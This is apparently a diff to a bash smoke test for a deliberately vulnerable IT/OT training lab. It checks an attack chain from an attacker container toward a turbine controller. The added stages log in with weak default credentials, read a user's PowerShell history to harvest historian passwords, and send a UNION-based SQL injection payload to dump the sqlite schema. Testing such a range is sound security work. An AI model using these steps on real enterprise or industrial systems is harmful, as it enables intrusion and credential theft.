@@ -1,6 +1,4 @@
 #!/usr/bin/env bash
-# Smoke test: books/enterprise-to-turbine-trip.md
-#
 # Walks through the full IT/OT chain from internet to turbine PLC. Assumes
 # './ctl up' has been run.
 #
@@ -20,7 +18,7 @@
 # enterprise/operational hosts use paramiko's chained transport from
 # attacker-machine, mirroring 'ssh -J rincewind@10.10.0.10 ...'.
 #
-# Usage: bash tests/smoke/test_runbook_enterprise_to_turbine_trip.sh
+# Usage: bash tests/smoke/test_enterprise_to_turbine_trip.sh
 set -uo pipefail
 
 REPO="$(cd "$(dirname "$0")/../.." && pwd)"
@@ -43,10 +41,18 @@ wait_for_port "$HOME_BOX"  10.10.1.10 21 30 || fail "hex-legacy-1 ftp not ready"
 wait_for_port "$HOME_BOX"  10.10.1.20 22 30 || fail "bursar-desk sshd not ready"
 wait_for_port "$ENT_WS"    10.10.2.10 8080 30 || fail "historian web not ready"
 
-echo "[ent-to-trip] Stage 0: SSH rincewind/wizzard"
+echo "[ent-to-trip] Stage 0a: SSH rincewind/wizzard"
 
 LOGIN_OUT="$(ssh_password_login "$ATTACKER" rincewind 10.10.0.10 wizzard)"
 assert_contains "$LOGIN_OUT" "SSH_OK" "ssh rincewind/wizzard authenticates"
+
+echo "[ent-to-trip] Stage 0b: HTTP status endpoint (admin:admin recon path)"
+
+# The runbook lists 'curl -u admin:admin http://10.10.0.10/status' as Path B,
+# a recon-only entry that confirms admin-home is alive without compromising it.
+STATUS_OUT="$(in_container "$ATTACKER" curl -sf -u admin:admin -m 5 http://10.10.0.10/status 2>&1)"
+assert_contains "$STATUS_OUT" "hostname: admin-home" "/status returns admin-home identity"
+assert_contains "$STATUS_OUT" "vpn_status" "/status exposes vpn_status field"
 
 echo "[ent-to-trip] Stage 1a: hex-legacy-1 service ports open"
 
@@ -122,10 +128,26 @@ OPS_CONF="$(in_container "$ENT_WS" cat /opt/win10/C/Users/bursardesk/AppData/Roa
 assert_contains "$OPS_CONF" "Historian2015" "ops-access.conf contains historian password"
 assert_contains "$OPS_CONF" "10\.10\.2\.10" "ops-access.conf names historian host"
 
+# Alternate credential discovery path the runbook calls out: PowerShell history
+# at AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# is meant to expose the same credentials in a different shape.
+PS_HISTORY="$(in_container "$ENT_WS" cat "/opt/win10/C/Users/bursardesk/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt" 2>&1)"
+assert_contains "$PS_HISTORY" "10\.10\.2\.10|historian|Historian2015" \
+    "PowerShell history leaks historian credentials"
+
 echo "[ent-to-trip] Stage 3a: historian /assets endpoint"
 
 ASSETS="$(in_container "$ENT_WS" curl -sf http://10.10.2.10:8080/assets 2>&1)"
 assert_contains "$ASSETS" "turbine_main|turbine_rpm" "historian /assets returns a turbine asset"
+
+echo "[ent-to-trip] Stage 3a': SQL injection enumerates sqlite_master schema"
+
+# Runbook's first SQLi step lists the DB schema before targeting specific tables.
+SCHEMA_SQLI_URL="http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+name,sql,'x'+FROM+sqlite_master--&from=0&to=9"
+SCHEMA_OUT="$(in_container "$ENT_WS" curl -sf "$SCHEMA_SQLI_URL" 2>&1)"
+assert_contains "$SCHEMA_OUT" "readings"     "sqlite_master SQLi reveals readings table"
+assert_contains "$SCHEMA_OUT" "alarm_config" "sqlite_master SQLi reveals alarm_config table"
+assert_contains "$SCHEMA_OUT" "config"       "sqlite_master SQLi reveals config table"
 
 echo "[ent-to-trip] Stage 3b: SQL injection enumerates alarm_config"
 
